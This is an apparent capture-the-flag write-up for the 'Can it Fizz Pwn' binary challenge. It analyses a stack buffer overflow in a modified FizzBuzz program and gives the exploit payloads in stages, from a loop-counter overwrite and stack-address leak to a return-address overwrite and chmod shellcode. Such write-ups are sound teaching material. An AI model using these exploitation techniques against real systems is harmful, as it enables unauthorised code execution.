# **Can it Fizz Pwn Challenge Write-Up**

## **Challenge Overview**
A binary exploitation challenge based on a modified FizzBuzz game with a buffer overflow vulnerability leading to arbitrary code execution.

## **Vulnerability Analysis**

### **Key Vulnerability**
The challenge contains a critical buffer overflow in the `challenge()` function:

```c
read(0, local_48 + 4, 0xe0);  // Reads 224 bytes into small buffer
strcpy(local_18, local_20);   // Controlled strcpy operation
```

The `read()` call allows writing 224 bytes into a much smaller stack buffer, enabling overwriting of critical stack variables including:
- Loop counter (`uStack_24`)
- `local_20` (source pointer for strcpy)
- `local_18` (destination pointer for strcpy)

### **FizzBuzz Logic Exploitation**
The program implements modified FizzBuzz rules:
- **Divisible by 15**: `local_20 = &fuzzbuzz` (static address)
- **Divisible by 3**: `local_20 = fizz` (static address)  
- **Divisible by 5**: `local_20 = &local_30 + 4` (stack address - key to exploitation!)
- **Otherwise**: `local_20 = &nothing` (static address)

The **"Buzz" path** (divisible by 5) is crucial as it uses a stack-based pointer that we can control through the overflow.

## **Exploitation Strategy**

### **Phase 1: Loop Manipulation**
```python
first_payload = b"A" * 32 + p32(0xfffffff5)  # -11 in signed
```
- Overwrites buffer and sets loop counter to -11
- Ensures we reach iterations divisible by 5 to activate the Buzz path
- Maintains loop execution for multiple exploitation stages

### **Phase 2: Address Leakage**
```python
# At iteration where i % 5 == 0, local_20 points to &local_30 + 4
# strcpy copies the "Buzz" string, revealing local_30 address
local_30_address_value = u64(local_30_address_bytes.ljust(8, b'\x00'))
```
- Uses the Buzz path to leak `local_30` stack address
- This provides the necessary ASLR bypass by revealing stack layout

### **Phase 3: Pointer Control**
```python
third_payload = b"B" * 24 + p64(local_30_address_value - 0x17) + p32(0xfffffff5)
```
- Overwrites `local_30` to point to our shellcode buffer
- Maintains loop counter for final exploitation stage
- Calculates exact buffer address using fixed offset (0x17)

### **Phase 4: Code Execution**
```python
shellcode_payload = shellcode.ljust(24, b'C') 
shellcode_payload += p64(local_30_address_value - 0x17)  # local_30 -> shellcode
shellcode_payload += p32(0x77777777)                     # Break loop
shellcode_payload += p64(local_30_address_value)         # local_20 -> &local_30
shellcode_payload += p64(local_30_address_value + 0x2c)  # local_18 -> return address
```
- Places shellcode in buffer
- Sets up `local_30` to point to shellcode location
- Configures `local_20` and `local_18` for controlled strcpy:
  - **Source**: `local_20` points to `local_30` (which contains shellcode address)
  - **Destination**: `local_18` points to return address slot
- Final strcpy: `*(return_address) = shellcode_address`

## **Shellcode Design**
```asm
section .text
    global _start

_start:
    nop
    push 0x67616c66        ; "flag" string
    mov rdi, rsp           ; filename pointer
    mov si, 0x1ff          ; Mode 0777
    mov al, 90             ; chmod syscall number
    syscall
```
- Changes permissions of "flag" file to 0777
- Uses position-independent code
- Minimal size to fit in buffer constraints

## **Key Technical Insights**

### **Stack Layout Exploitation**
```
Buffer (rbp-0x50)    → Our shellcode
local_30 (rbp-0x30)  → Controlled to point to shellcode  
local_20 (rbp-0x20)  → Points to local_30 (source for strcpy)
local_18 (rbp-0x18)  → Points to return address (destination for strcpy)
```

### **Arbitrary Write Primitive**
The exploit chains the vulnerability to achieve:
1. **Arbitrary read** via Buzz path address leak
2. **Arbitrary write** via controlled strcpy parameters
3. **Code execution** via return address overwrite

### **Loop Counter Arithmetic**
Uses signed integer wrap-around to maintain control:
- `0xfffffff5` = -11 (continues loop)
- Careful iteration counting to hit divisible-by-5 conditions

## **Mitigation Bypasses**
- **ASLR**: Defeated via stack address leak through Buzz path
- **NX**: Not present or shellcode in executable region
- **Stack Canary**: Not present or not checked in vulnerable function

## **Conclusion**
This challenge demonstrates sophisticated stack manipulation through:
1. Understanding complex program logic (FizzBuzz variations)
2. Precise stack layout analysis and offset calculations
3. Multi-stage exploitation with address leaks and controlled writes
4. Creative use of program features (Buzz path) for exploitation

The solution showcases how seemingly benign programming exercises can hide critical memory corruption vulnerabilities when combined with unsafe C functions.

